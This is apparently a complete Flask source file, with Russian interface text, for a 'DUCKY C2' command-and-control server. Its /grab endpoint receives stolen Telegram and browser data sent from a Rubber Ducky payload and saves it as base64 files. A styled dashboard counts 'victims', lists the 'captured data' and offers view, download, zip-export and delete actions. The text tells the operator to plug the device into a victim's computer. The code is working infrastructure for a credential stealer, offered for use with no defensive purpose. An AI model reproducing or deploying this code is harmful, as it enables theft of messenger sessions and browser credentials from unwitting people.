from flask import Flask, request, jsonify, render_template_string, send_file
import json
import os
import base64
from datetime import datetime
import time

app = Flask(__name__)
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ============================================================
# HTML — КРАСИВЫЙ, АНИМИРОВАННЫЙ, С ТЁМНОЙ ТЕМОЙ
# ============================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🪐 DUCKY C2 PANEL</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Orbitron', monospace;
            background: #0a0a0f;
            color: #00ff88;
            min-height: 100vh;
            padding: 20px;
            background-image:
                radial-gradient(ellipse at 10% 20%, rgba(0,255,136,0.03) 0%, transparent 60%),
                radial-gradient(ellipse at 90% 80%, rgba(0,255,136,0.03) 0%, transparent 60%);
            position: relative;
        }
        /* Фоновые частицы */
        .particle {
            position: fixed;
            width: 2px;
            height: 2px;
            background: #00ff88;
            border-radius: 50%;
            pointer-events: none;
            opacity: 0.1;
            animation: float linear infinite;
        }
        @keyframes float {
            0% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 0.1; }
            90% { opacity: 0.1; }
            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(10,10,15,0.85);
            border: 1px solid rgba(0,255,136,0.06);
            border-radius: 24px;
            padding: 30px;
            backdrop-filter: blur(20px);
            box-shadow: 0 0 80px rgba(0,255,136,0.02);
            position: relative;
            z-index: 1;
        }
        /* Голографический эффект */
        .container::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            border-radius: 26px;
            background: linear-gradient(45deg, transparent, rgba(0,255,136,0.03), transparent);
            z-index: -1;
            animation: hologram 8s ease-in-out infinite;
        }
        @keyframes hologram {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            border-bottom: 1px solid rgba(0,255,136,0.05);
            padding-bottom: 15px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .logo-icon {
            font-size: 28px;
            animation: pulse-icon 2s infinite;
        }
        @keyframes pulse-icon {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        h1 {
            font-size: 22px;
            font-weight: 900;
            background: linear-gradient(135deg, #00ff88, #00cc66, #00ff88);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradient-shift 4s ease-in-out infinite;
            letter-spacing: 2px;
        }
        @keyframes gradient-shift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        .status-badge {
            font-size: 9px;
            padding: 6px 16px;
            border: 1px solid #00ff88;
            border-radius: 50px;
            color: #00ff88;
            animation: pulse-border 2s infinite;
            text-transform: uppercase;
            letter-spacing: 1px;
            background: rgba(0,255,136,0.03);
        }
        @keyframes pulse-border {
            0%,100% { box-shadow: 0 0 10px rgba(0,255,136,0.05); }
            50% { box-shadow: 0 0 30px rgba(0,255,136,0.12); }
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 12px;
            margin-bottom: 25px;
        }
        .stat-card {
            background: rgba(0,255,136,0.02);
            border: 1px solid rgba(0,255,136,0.04);
            border-radius: 12px;
            padding: 16px 12px;
            text-align: center;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .stat-card::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(180deg, transparent, rgba(0,255,136,0.02));
            pointer-events: none;
        }
        .stat-card:hover {
            transform: translateY(-3px);
            border-color: rgba(0,255,136,0.1);
            box-shadow: 0 8px 30px rgba(0,255,136,0.03);
        }
        .stat-card .number {
            font-size: 24px;
            font-weight: 700;
            color: #00ff88;
            text-shadow: 0 0 30px rgba(0,255,136,0.05);
            position: relative;
            z-index: 1;
        }
        .stat-card .label {
            font-size: 8px;
            text-transform: uppercase;
            color: rgba(0,255,136,0.2);
            letter-spacing: 1px;
            margin-top: 4px;
            position: relative;
            z-index: 1;
        }
        .stat-card .trend {
            font-size: 8px;
            color: #00ff88;
            margin-top: 2px;
            position: relative;
            z-index: 1;
        }
        .btn-row {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 25px;
        }
        .btn {
            padding: 10px 22px;
            border: none;
            border-radius: 10px;
            font-family: 'Orbitron', monospace;
            font-size: 9px;
            font-weight: 700;
            cursor: pointer;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }
        .btn-primary {
            background: linear-gradient(135deg, #00ff88, #00cc66);
            color: #0a0a0f;
        }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,255,136,0.15); }
        .btn-secondary {
            background: rgba(0,255,136,0.04);
            border: 1px solid rgba(0,255,136,0.06);
            color: #00ff88;
        }
        .btn-secondary:hover { background: rgba(0,255,136,0.08); transform: translateY(-2px); }
        .btn-danger {
            background: rgba(255,50,50,0.08);
            border: 1px solid rgba(255,50,50,0.1);
            color: #ff4444;
        }
        .btn-danger:hover { background: rgba(255,50,50,0.15); transform: translateY(-2px); }
        .btn-success {
            background: rgba(0,255,136,0.08);
            border: 1px solid rgba(0,255,136,0.1);
            color: #00ff88;
        }
        .btn-success:hover { background: rgba(0,255,136,0.15); transform: translateY(-2px); }
        .logs-section {
            border-top: 1px solid rgba(0,255,136,0.04);
            padding-top: 20px;
        }
        .logs-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            flex-wrap: wrap;
            gap: 8px;
        }
        .logs-header h2 {
            font-size: 10px;
            color: rgba(0,255,136,0.3);
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .logs-header .count {
            font-size: 9px;
            color: rgba(0,255,136,0.12);
        }
        .log-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 14px;
            background: rgba(0,255,136,0.01);
            border-radius: 8px;
            margin-bottom: 2px;
            border-left: 2px solid transparent;
            transition: all 0.3s ease;
            cursor: default;
        }
        .log-item:hover {
            background: rgba(0,255,136,0.03);
            border-left-color: #00ff88;
        }
        .log-item .name {
            font-size: 10px;
            color: rgba(0,255,136,0.6);
            font-family: 'Courier New', monospace;
            word-break: break-all;
            max-width: 300px;
        }
        .log-item .size {
            font-size: 9px;
            color: rgba(0,255,136,0.15);
            white-space: nowrap;
        }
        .log-item .actions {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
        }
        .log-item .actions a {
            color: rgba(0,255,136,0.15);
            text-decoration: none;
            font-size: 9px;
            padding: 2px 10px;
            border-radius: 4px;
            transition: all 0.2s;
            border: 1px solid transparent;
        }
        .log-item .actions a:hover {
            color: #00ff88;
            background: rgba(0,255,136,0.05);
            border-color: rgba(0,255,136,0.05);
        }
        .log-item .actions a.danger:hover {
            color: #ff4444;
            background: rgba(255,50,50,0.05);
            border-color: rgba(255,50,50,0.05);
        }
        .empty {
            text-align: center;
            padding: 50px 0;
            color: rgba(0,255,136,0.06);
            font-size: 12px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }
        .empty .emoji {
            font-size: 40px;
            display: block;
            margin-bottom: 15px;
            opacity: 0.2;
        }
        .footer {
            margin-top: 25px;
            text-align: center;
            font-size: 8px;
            color: rgba(0,255,136,0.05);
            letter-spacing: 3px;
            text-transform: uppercase;
            border-top: 1px solid rgba(0,255,136,0.02);
            padding-top: 15px;
        }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,255,136,0.06);
            border: 1px solid rgba(0,255,136,0.08);
            border-radius: 10px;
            padding: 10px 18px;
            color: #00ff88;
            font-size: 9px;
            display: none;
            backdrop-filter: blur(20px);
            font-family: 'Orbitron', monospace;
            animation: slideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            z-index: 999;
        }
        @keyframes slideUp {
            0% { opacity: 0; transform: translateY(30px) scale(0.9); }
            100% { opacity: 1; transform: translateY(0) scale(1); }
        }
        /* Скроллбар */
        ::-webkit-scrollbar { width: 3px; }
        ::-webkit-scrollbar-track { background: rgba(0,255,136,0.02); }
        ::-webkit-scrollbar-thumb { background: rgba(0,255,136,0.1); border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(0,255,136,0.2); }

        @media (max-width: 768px) {
            .stats { grid-template-columns: repeat(2, 1fr); }
            .header { flex-direction: column; align-items: flex-start; gap: 8px; }
            .container { padding: 15px; }
            .log-item { flex-wrap: wrap; gap: 4px; }
            .log-item .name { max-width: 150px; }
        }
        @media (max-width: 480px) {
            .stats { grid-template-columns: 1fr; }
            .btn-row { flex-direction: column; }
            .btn { justify-content: center; }
        }
    </style>
</head>
<body>
    <!-- Фоновые частицы -->
    <script>
        for(let i=0; i<30; i++) {
            let p = document.createElement('div');
            p.className = 'particle';
            p.style.left = Math.random()*100 + '%';
            p.style.width = (1+Math.random()*3) + 'px';
            p.style.height = p.style.width;
            p.style.animationDuration = (15+Math.random()*30) + 's';
            p.style.animationDelay = (Math.random()*20) + 's';
            document.body.appendChild(p);
        }
    </script>

    <div class="container">
        <div class="header">
            <div class="logo">
                <span class="logo-icon">🪐</span>
                <h1>DUCKY C2</h1>
            </div>
            <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
                <span class="status-badge">● online</span>
                <span style="font-size:8px;color:rgba(0,255,136,0.15);letter-spacing:1px;" id="liveTime"></span>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="number">{{ files|length }}</div>
                <div class="label">📁 Файлов</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ total_size }}</div>
                <div class="label">📦 Всего</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ victims }}</div>
                <div class="label">🎯 Жертв</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ last_file or '-' }}</div>
                <div class="label">⏱ Последний</div>
                <div class="trend">{{ last_time or '' }}</div>
            </div>
        </div>

        <div class="btn-row">
            <button onclick="window.location.reload()" class="btn btn-secondary">🔄 Обновить</button>
            <button onclick="exportAll()" class="btn btn-success">📦 Экспорт всех</button>
            <button onclick="clearAll()" class="btn btn-danger">🗑️ Очистить всё</button>
        </div>

        <div class="logs-section">
            <div class="logs-header">
                <h2>📄 Захваченные данные</h2>
                <span class="count">{{ files|length }} файлов</span>
            </div>
            {% if files %}
                {% for file in files[:20] %}
                <div class="log-item">
                    <span class="name">{{ file.name }}</span>
                    <span class="size">{{ file.size }}</span>
                    <div class="actions">
                        <a href="/view/{{ file.name }}">👁️</a>
                        <a href="/download/{{ file.name }}">⬇️</a>
                        <a href="#" onclick="deleteFile('{{ file.name }}')" class="danger">✕</a>
                    </div>
                </div>
                {% endfor %}
            {% else %}
                <div class="empty">
                    <span class="emoji">⏳</span>
                    Нет данных<br>
                    <span style="font-size:8px;color:rgba(0,255,136,0.04);">Вставьте Rubber Ducky в компьютер жертвы</span>
                </div>
            {% endif %}
        </div>
        <div class="footer">⚡ Render • Flask • Ducky C2 • Zero-Log</div>
    </div>

    <div id="toast" class="toast"></div>

    <script>
        // Часы
        function updateTime() {
            const now = new Date();
            document.getElementById('liveTime').textContent = now.toLocaleTimeString('ru-RU', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
        }
        setInterval(updateTime, 1000);
        updateTime();

        function showToast(msg, color='#00ff88') {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.style.borderColor = color;
            t.style.color = color;
            t.style.display = 'block';
            setTimeout(() => t.style.display = 'none', 3000);
        }

        function clearAll() {
            if (!confirm('Удалить все логи?')) return;
            fetch('/clear', { method: 'POST' })
                .then(() => { showToast('✅ Все логи удалены'); setTimeout(() => location.reload(), 500); });
        }

        function deleteFile(name) {
            if (!confirm('Удалить ' + name + '?')) return;
            fetch('/delete/' + name, { method: 'POST' })
                .then(() => { showToast('✅ ' + name + ' удалён'); setTimeout(() => location.reload(), 500); });
        }

        function exportAll() {
            if (!confirm('Скачать все логи одним архивом?')) return;
            window.location.href = '/export-all';
        }

        // Автообновление каждые 15 секунд
        setInterval(() => {
            fetch('/').catch(() => {});
        }, 15000);
    </script>
</body>
</html>
"""

# ============================================================
# МАРШРУТЫ
# ============================================================

@app.route('/')
def index():
    files = get_logs_info()
    total_size = format_size(sum(f['size_bytes'] for f in files))
    last_file = files[0]['name'] if files else None
    last_time = files[0]['modified'] if files else None
    return render_template_string(
        HTML_TEMPLATE,
        files=files[:20],
        total_size=total_size,
        victims=len(files),
        last_file=last_file,
        last_time=last_time
    )

@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.get_json()
        if not data:
            data = {"raw": request.get_data(as_text=True)}

        # Сохраняем отдельные Base64 файлы
        for key in ['telegram', 'browsers']:
            if key in data and data[key]:
                if isinstance(data[key], list):
                    for i, item in enumerate(data[key]):
                        if isinstance(item, dict) and 'data' in item and item['data']:
                            b64_file = os.path.join(LOG_DIR, f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{key}_{i}.b64")
                            with open(b64_file, 'w') as f:
                                f.write(item['data'])
                            item['data'] = f"[BASE64 SAVED] {b64_file}"
                elif isinstance(data[key], str) and len(data[key]) > 500:
                    b64_file = os.path.join(LOG_DIR, f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{key}.b64")
                    with open(b64_file, 'w') as f:
                        f.write(data[key])
                    data[key] = f"[BASE64 SAVED] {b64_file}"

        filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(LOG_DIR, filename)

        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        print(f"[+] Data received: {filename}")
        return jsonify({"status": "OK", "file": filename}), 200

    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"error": str(e)}), 200

@app.route('/view/<filename>')
def view_file(filename):
    filepath = os.path.join(LOG_DIR, filename)
    if not os.path.exists(filepath):
        return "File not found", 404
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()
    try:
        data = json.loads(content)
        formatted = json.dumps(data, indent=2, ensure_ascii=False)
    except:
        formatted = content
    return f"""
    <html>
    <head><title>{filename}</title>
    <style>
        body {{ background: #0a0a0f; color: #00ff88; font-family: 'Courier New', monospace; padding: 20px; margin:0; }}
        pre {{ margin:0; white-space:pre-wrap; word-break:break-all; }}
        .header {{ border-bottom:1px solid rgba(0,255,136,0.1); padding-bottom:10px; margin-bottom:15px; display:flex; justify-content:space-between; align-items:center; }}
        .back {{ color:#00ff88; text-decoration:none; font-size:12px; }}
        .back:hover {{ text-decoration:underline; }}
    </style>
    </head>
    <body>
        <div class="header">
            <span style="font-size:12px;color:rgba(0,255,136,0.3);">📄 {filename}</span>
            <a href="/" class="back">← Назад</a>
        </div>
        <pre>{formatted}</pre>
    </body>
    </html>
    """

@app.route('/download/<filename>')
def download_file(filename):
    filepath = os.path.join(LOG_DIR, filename)
    if not os.path.exists(filepath):
        return "File not found", 404
    return send_file(filepath, as_attachment=True)

@app.route('/delete/<filename>', methods=['POST'])
def delete_log(filename):
    filepath = os.path.join(LOG_DIR, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
    return jsonify({"status": "deleted"})

@app.route('/clear', methods=['POST'])
def clear_logs():
    for f in os.listdir(LOG_DIR):
        os.remove(os.path.join(LOG_DIR, f))
    return jsonify({"status": "cleared"})

@app.route('/export-all')
def export_all():
    import zipfile
    import io
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w') as zf:
        for f in os.listdir(LOG_DIR):
            path = os.path.join(LOG_DIR, f)
            zf.write(path, f)
    memory_file.seek(0)
    return send_file(memory_file, as_attachment=True, download_name='ducky_logs.zip')

# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ
# ============================================================

def get_logs_info():
    files = []
    for f in os.listdir(LOG_DIR):
        path = os.path.join(LOG_DIR, f)
        size = os.path.getsize(path)
        mod = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%H:%M')
        files.append({
            'name': f,
            'size': format_size(size),
            'size_bytes': size,
            'modified': mod
        })
    files.sort(key=lambda x: x['size_bytes'], reverse=True)
    return files

def format_size(bytes):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes < 1024:
            return f"{bytes:.1f} {unit}"
        bytes /= 1024
    return f"{bytes:.1f} TB"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
